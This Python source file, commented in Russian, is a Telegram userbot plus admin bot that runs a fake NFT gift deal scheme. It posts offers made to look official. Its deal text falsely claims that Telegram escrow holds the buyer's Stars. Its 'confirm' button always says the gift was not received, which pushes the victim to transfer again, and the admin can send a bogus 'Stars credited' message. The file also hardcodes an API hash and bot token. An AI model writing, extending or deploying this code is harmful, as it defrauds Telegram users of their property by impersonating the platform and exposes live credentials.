# userbot.py — NFT Deal Userbot | Telethon 1.x
# Работает от твоего аккаунта, не бот — Telegram не режет офферы
import asyncio
import logging
import random
import re
import sqlite3
import string
from datetime import datetime, timedelta

from telethon import TelegramClient, events, Button
from telethon.sessions import StringSession
from aiogram import Bot
from aiogram.client.default import DefaultBotProperties
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.utils.keyboard import InlineKeyboardBuilder

# ── НАСТРОЙКИ ────────────────────────────────────────────────
API_ID   = 38237346
API_HASH = "5dc9220c75b83f01b47833778a2b5409"
BOT_TOKEN = "8838053480:AAGjSxVlwocfBmEfHEQFRUHXmrjmOEA_3mo"
ADMIN_ID  = 8926402887
TRIGGER   = ".buy"    # команда

# ── БД ───────────────────────────────────────────────────────
db = sqlite3.connect("deals.db", check_same_thread=False)
db.row_factory = sqlite3.Row
db.executescript("""
CREATE TABLE IF NOT EXISTS deals (
    order_id        TEXT PRIMARY KEY,
    buyer_username  TEXT,
    chat_id         INTEGER,
    nft_url         TEXT,
    nft_slug        TEXT,
    nft_num         TEXT,
    amount          INTEGER,
    status          TEXT DEFAULT 'offer',
    created_at      TEXT,
    offer_msg_id    INTEGER,
    sent_at         TEXT
);
CREATE TABLE IF NOT EXISTS allowed_users (
    user_id         INTEGER PRIMARY KEY
);
CREATE TABLE IF NOT EXISTS allowed_usernames (
    username        TEXT PRIMARY KEY
);
""")
db.commit()

# ── Клиенты ──────────────────────────────────────────────────
# если есть сохранённая строка сессии — грузим её, иначе авторизуемся заново
import os
SESSION_FILE = "session_string.txt"
try:
    with open(SESSION_FILE) as f:
        _session_str = f.read().strip()
except FileNotFoundError:
    _session_str = os.environ.get("TG_SESSION", "")

client = TelegramClient(StringSession(_session_str), API_ID, API_HASH)
bot    = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode="HTML"))

# состояния авторизации
auth_state = {}
auth_data  = {}


# ── Доступ ───────────────────────────────────────────────────
def is_allowed(user_id: int, username: str = None) -> bool:
    if user_id == ADMIN_ID:
        return True
    row = db.execute("SELECT 1 FROM allowed_users WHERE user_id=?", (user_id,)).fetchone()
    if row:
        return True
    if username:
        uname = username.lstrip("@").lower()
        row2 = db.execute("SELECT 1 FROM allowed_usernames WHERE username=?", (uname,)).fetchone()
        if row2:
            return True
    return False

def add_user(value: str):
    value = value.strip()
    if value.lstrip("@").isdigit():
        db.execute("INSERT OR IGNORE INTO allowed_users (user_id) VALUES (?)", (int(value.lstrip("@")),))
    else:
        db.execute("INSERT OR IGNORE INTO allowed_usernames (username) VALUES (?)", (value.lstrip("@").lower(),))
    db.commit()

def remove_user(value: str):
    value = value.strip()
    if value.lstrip("@").isdigit():
        db.execute("DELETE FROM allowed_users WHERE user_id=?", (int(value.lstrip("@")),))
    else:
        db.execute("DELETE FROM allowed_usernames WHERE username=?", (value.lstrip("@").lower(),))
    db.commit()


def gen_order_id() -> str:
    return "TG-" + "".join(random.choices(string.ascii_uppercase + string.digits, k=8))


def parse_nft(url: str):
    m = re.match(r"https?://t\.me/nft/([A-Za-z]+)-(\d+)", url)
    return (m.group(1), m.group(2)) if m else (None, None)


def get_deal(order_id: str) -> dict | None:
    row = db.execute("SELECT * FROM deals WHERE order_id=?", (order_id,)).fetchone()
    return dict(row) if row else None


def upd(order_id: str, **kw):
    for k, v in kw.items():
        db.execute(f"UPDATE deals SET {k}=? WHERE order_id=?", (v, order_id))
    db.commit()


def fmt_remaining(sent_at_str: str) -> str:
    sent_at   = datetime.fromisoformat(sent_at_str)
    deadline  = sent_at + timedelta(hours=6)
    remaining = deadline - datetime.now()
    if remaining.total_seconds() <= 0:
        return "0 ч. 0 мин."
    total_min = int(remaining.total_seconds() // 60)
    h, m = divmod(total_min, 60)
    return f"{h} ч. {m} мин."


def offer_text(d: dict) -> str:
    return (
        f"Пользователь предлагает вам "
        f"**{d['amount']:,} Звёзд** за подарок "
        f"[{d['nft_slug']} #{d['nft_num']}]({d['nft_url']}).\n\n"
        f"Оффер действителен ещё **{fmt_remaining(d['sent_at'])}**"
    )


def deal_text(d: dict) -> str:
    return (
        f"Ордер **#{d['order_id']}**\n\n"
        f"Покупатель зарезервировал **{d['amount']:,} ⭐️ Звёзд** через эскроу-систему "
        f"Telegram. Средства хранятся на специальном эскроу-счёте и будут автоматически "
        f"зачислены на ваш баланс Telegram Stars сразу после передачи подарка.\n\n"
        f"**Инструкция для завершения сделки:**\n"
        f"1. Передайте подарок пользователю: @{d['buyer_username']}\n"
        f"2. Нажмите «Передать NFT» и выберите [{d['nft_slug']} #{d['nft_num']}]({d['nft_url']})\n"
        f"3. Подтвердите передачу подарка.\n\n"
        f"Telegram зафиксирует транзакцию и моментально зачислит "
        f"**{d['amount']:,} ⭐️ Звёзд** на ваш баланс. Резерв действует 24 часа."
    )


def offer_buttons(order_id: str):
    return [
        [Button.inline("Отклонить", f"decline:{order_id}"),
         Button.inline("Принять",   f"accept:{order_id}")]
    ]


def deal_buttons(d: dict):
    return [
        [Button.inline("Передать NFT ↗",       f"transfer:{d['order_id']}")],
        [Button.inline("Подтвердить передачу", f"confirm:{d['order_id']}")],
    ]


def admin_kb(order_id: str):
    kb = InlineKeyboardBuilder()
    kb.row(
        InlineKeyboardButton(text="Подтвердить", callback_data=f"adm_ok:{order_id}"),
        InlineKeyboardButton(text="Не передан",  callback_data=f"adm_no:{order_id}")
    )
    return kb.as_markup()


# ── Таймер ───────────────────────────────────────────────────
async def offer_timer(order_id: str):
    while True:
        await asyncio.sleep(60)
        d = get_deal(order_id)
        if not d or d['status'] != 'offer':
            break
        deadline = datetime.fromisoformat(d['sent_at']) + timedelta(hours=6)
        if datetime.now() >= deadline:
            upd(order_id, status='expired')
            try:
                await client.edit_message(
                    d['chat_id'], d['offer_msg_id'],
                    "Оффер истёк.", buttons=None
                )
            except Exception:
                pass
            break
        try:
            await client.edit_message(
                d['chat_id'], d['offer_msg_id'],
                offer_text(d),
                buttons=offer_buttons(order_id),
                link_preview=True,
                parse_mode='md'
            )
        except Exception:
            pass


# ── .buy от владельца аккаунта ───────────────────────────────
@client.on(events.NewMessage(outgoing=True, pattern=r"^\.buy\s+\S+\s+\d+"))
async def on_buy(event):
    me = await client.get_me()
    sender_id = me.id
    username  = me.username

    if not is_allowed(sender_id, username):
        await event.delete()
        return

    parts   = event.raw_text.strip().split()
    nft_url = parts[1]
    amount  = int(parts[2])

    slug, num = parse_nft(nft_url)
    if not slug:
        await event.delete()
        return

    # удаляем .buy сообщение
    await event.delete()

    order_id = gen_order_id()
    chat_id  = event.chat_id
    sent_at  = datetime.now().isoformat()
    buyer_username = username or str(sender_id)

    db.execute("""
        INSERT INTO deals
          (order_id, buyer_username, chat_id, nft_url, nft_slug, nft_num,
           amount, status, created_at, sent_at)
        VALUES (?, ?, ?, ?, ?, ?, ?, 'offer', ?, ?)
    """, (order_id, buyer_username, chat_id, nft_url, slug, num,
          amount, sent_at, sent_at))
    db.commit()

    d = get_deal(order_id)

    msg = await client.send_message(
        chat_id,
        offer_text(d),
        buttons=offer_buttons(order_id),
        link_preview=True,
        parse_mode='md'
    )
    upd(order_id, offer_msg_id=msg.id)
    asyncio.create_task(offer_timer(order_id))

    # уведомляем тебя
    try:
        await bot.send_message(
            ADMIN_ID,
            f"📤 <b>Новый оффер</b>\n\n"
            f"Ордер: <b>{order_id}</b>\n"
            f"NFT: <b>{slug} #{num}</b>\n"
            f"Сумма: <b>{amount:,} ⭐️</b>\n"
            f"Ссылка: {nft_url}"
        )
    except Exception as e:
        logging.error(e)


# ── Входящие callback от кнопок ──────────────────────────────
@client.on(events.CallbackQuery())
async def on_callback(event):
    data = event.data.decode()

    # ── Принять ──────────────────────────────────────────────
    if data.startswith("accept:"):
        order_id = data.split(":")[1]
        d = get_deal(order_id)
        if not d or d['status'] != 'offer':
            await event.answer("Оффер недоступен.", alert=True)
            return

        upd(order_id, status='active')
        await event.answer(
            "Внимание!\n\n"
            "Следуйте инструкции, чтобы не потерять подарок и получить оплату.\n\n"
            "Нажмите «ОК», если вы прочитали это сообщение.",
            alert=True
        )
        try:
            await client.edit_message(
                d['chat_id'], d['offer_msg_id'],
                deal_text(d),
                buttons=deal_buttons(d),
                link_preview=True,
                parse_mode='md'
            )
        except Exception as e:
            logging.error(f"edit to deal: {e}")

    # ── Отклонить ────────────────────────────────────────────
    elif data.startswith("decline:"):
        order_id = data.split(":")[1]
        d = get_deal(order_id)
        if not d:
            return

        upd(order_id, status='declined')
        await event.answer("Вы отклонили оффер.")
        try:
            await client.edit_message(
                d['chat_id'], d['offer_msg_id'],
                f"Оффер на NFT [{d['nft_slug']} #{d['nft_num']}]({d['nft_url']}) отменён.",
                buttons=None, link_preview=False, parse_mode='md'
            )
        except Exception as e:
            logging.error(e)

    # ── Передать NFT ─────────────────────────────────────────
    elif data.startswith("transfer:"):
        order_id = data.split(":")[1]
        d = get_deal(order_id)
        if not d:
            return
        await event.answer(
            f"Откройте профиль @{d['buyer_username']} и передайте подарок {d['nft_slug']} #{d['nft_num']}.",
            alert=True
        )

    # ── Подтвердить передачу ─────────────────────────────────
    elif data.startswith("confirm:"):
        order_id = data.split(":")[1]
        d = get_deal(order_id)
        if not d or d['status'] != 'active':
            await event.answer("Ордер недоступен.", alert=True)
            return

        await event.answer(
            "Внимание!\n\nТовар не получен, попробуйте передать ещё раз и нажмите кнопку.",
            alert=True
        )
        try:
            await bot.send_message(
                ADMIN_ID,
                f"🔔 <b>Попытка подтверждения</b>\n\n"
                f"Ордер: <b>{d['order_id']}</b>\n"
                f"NFT: <b>{d['nft_slug']} #{d['nft_num']}</b>\n"
                f"Сумма: <b>{d['amount']:,} ⭐️</b>\n"
                f"Покупатель: @{d['buyer_username']}\n"
                f"Ссылка: {d['nft_url']}\n\n"
                f"Нажми если NFT реально передан:",
                reply_markup=admin_kb(order_id)
            )
        except Exception as e:
            logging.error(e)


# ── /add /remove /users через Saved Messages ─────────────────
@client.on(events.NewMessage(outgoing=True, chats="me", pattern=r"^/(add|remove|users)"))
async def on_admin_cmd(event):
    text = event.raw_text.strip()
    await event.delete()

    if text.startswith("/add "):
        val = text.split()[1]
        add_user(val)
        await client.send_message("me", f"✅ Доступ выдан: {val}")

    elif text.startswith("/remove "):
        val = text.split()[1]
        remove_user(val)
        await client.send_message("me", f"✅ Доступ забран: {val}")

    elif text == "/users":
        ids   = db.execute("SELECT user_id FROM allowed_users").fetchall()
        names = db.execute("SELECT username FROM allowed_usernames").fetchall()
        if not ids and not names:
            await client.send_message("me", "Список пуст.")
            return
        lines = [str(r['user_id']) for r in ids] + ["@" + r['username'] for r in names]
        await client.send_message("me", "Пользователи с доступом:\n" + "\n".join(lines))


# ── Бот для подтверждения/отклонения от админа ───────────────
from aiogram import Dispatcher, F
from aiogram.types import CallbackQuery as AioCallbackQuery

bot_dp = Dispatcher()

@bot_dp.message(F.text)
async def auth_handler(msg):
    uid = msg.from_user.id
    if uid != ADMIN_ID:
        return
    text = msg.text.strip()

    if auth_state.get(uid) == "phone":
        phone = text
        auth_data[uid] = {"phone": phone}
        try:
            result = await client.send_code_request(phone)
            auth_data[uid]["phone_code_hash"] = result.phone_code_hash
            auth_state[uid] = "code"
            await bot.send_message(uid, "📨 Код отправлен в Telegram. Введи код:")
        except Exception as e:
            from aiogram.utils.markdown import html_decoration as hd
            await bot.send_message(uid, f"❌ Ошибка: {hd.quote(str(e))}")
            auth_state.pop(uid, None)

    elif auth_state.get(uid) == "code":
        code = text.replace(" ", "")
        phone = auth_data[uid]["phone"]
        phone_code_hash = auth_data[uid]["phone_code_hash"]
        try:
            await client.sign_in(phone, code, phone_code_hash=phone_code_hash)
            await finish_auth(uid)
        except Exception as e:
            err = str(e)
            if "2FA" in err or "password" in err.lower() or "SessionPasswordNeeded" in err:
                auth_state[uid] = "2fa"
                await bot.send_message(uid, "🔒 Введи облачный пароль (2FA):")
            else:
                from aiogram.utils.markdown import html_decoration as hd
                await bot.send_message(uid, f"❌ Ошибка: {hd.quote(str(e))}")
                auth_state.pop(uid, None)

    elif auth_state.get(uid) == "2fa":
        password = text
        try:
            await client.sign_in(password=password)
            await finish_auth(uid)
        except Exception as e:
            from aiogram.utils.markdown import html_decoration as hd
            await bot.send_message(uid, f"❌ Неверный пароль: {hd.quote(str(e))}")


async def finish_auth(uid: int):
    auth_state.pop(uid, None)
    auth_data.pop(uid, None)
    me = await client.get_me()
    session_str = client.session.save()
    with open(SESSION_FILE, "w") as f:
        f.write(session_str)
    await bot.send_message(
        uid,
        f"✅ Авторизован как @{me.username} ({me.id})\n\n"
        f"<b>Строка сессии (сохрани):</b>\n<code>{session_str}</code>\n\n"
        f"Перезапусти бота чтобы юзербот начал работать."
    )


@bot_dp.callback_query(F.data.startswith("adm_ok:"))
async def cb_adm_ok(call: AioCallbackQuery):
    if call.from_user.id != ADMIN_ID:
        return
    order_id = call.data.split(":")[1]
    d = get_deal(order_id)
    if not d:
        return

    upd(order_id, status='completed')
    await call.answer("Подтверждено.")
    await call.message.edit_reply_markup(reply_markup=None)

    try:
        await client.send_message(
            d['chat_id'],
            f"Передача подтверждена!\n\nОрдер **#{d['order_id']}**\n"
            f"**{d['amount']:,} ⭐️ Звёзд** зачислены на ваш баланс Telegram Stars.",
            parse_mode='md'
        )
    except Exception as e:
        logging.error(e)


@bot_dp.callback_query(F.data.startswith("adm_no:"))
async def cb_adm_no(call: AioCallbackQuery):
    if call.from_user.id != ADMIN_ID:
        return
    order_id = call.data.split(":")[1]
    d = get_deal(order_id)
    if not d:
        return

    upd(order_id, status='active')
    await call.answer("Отклонено.")
    await call.message.edit_reply_markup(reply_markup=None)

    try:
        await client.edit_message(
            d['chat_id'], d['offer_msg_id'],
            deal_text(d),
            buttons=deal_buttons(d),
            link_preview=True,
            parse_mode='md'
        )
    except Exception as e:
        logging.error(e)


# ── Запуск ───────────────────────────────────────────────────
async def main():
    logging.basicConfig(level=logging.INFO)

    # убираем все команды меню кроме start
    from aiogram.types import BotCommand
    await bot.set_my_commands([BotCommand(command="start", description="Запустить")])
    await bot.delete_webhook(drop_pending_updates=True)

    if _session_str:
        # сессия есть — коннектимся без ввода
        await client.connect()
        if not await client.is_user_authorized():
            await bot.send_message(ADMIN_ID, "📱 Сессия устарела. Введи номер телефона:\n(формат: +79001234567)")
            auth_state[ADMIN_ID] = "phone"
            await bot_dp.start_polling(bot, allowed_updates=["callback_query", "message"])
            return
        me = await client.get_me()
        logging.info(f"Userbot запущен как @{me.username} ({me.id})")
        session_str = client.session.save()
        with open(SESSION_FILE, "w") as f:
            f.write(session_str)
        try:
            await bot.send_message(
                ADMIN_ID,
                f"✅ Юзербот запущен как @{me.username}\n\n"
                f"<b>Сессия (сохрани):</b>\n<code>{session_str}</code>"
            )
        except Exception:
            pass
        # запускаем бота и клиента параллельно
        await asyncio.gather(
            bot_dp.start_polling(bot, allowed_updates=["callback_query", "message"]),
            client.run_until_disconnected()
        )
    else:
        # сессии нет — сначала авторизуемся через бота
        await client.connect()
        await bot.send_message(ADMIN_ID, "📱 Введи номер телефона для авторизации:\n(формат: +79001234567)")
        auth_state[ADMIN_ID] = "phone"
        # polling держим пока не авторизуемся
        await bot_dp.start_polling(bot, allowed_updates=["callback_query", "message"])


if __name__ == "__main__":
    asyncio.run(main())
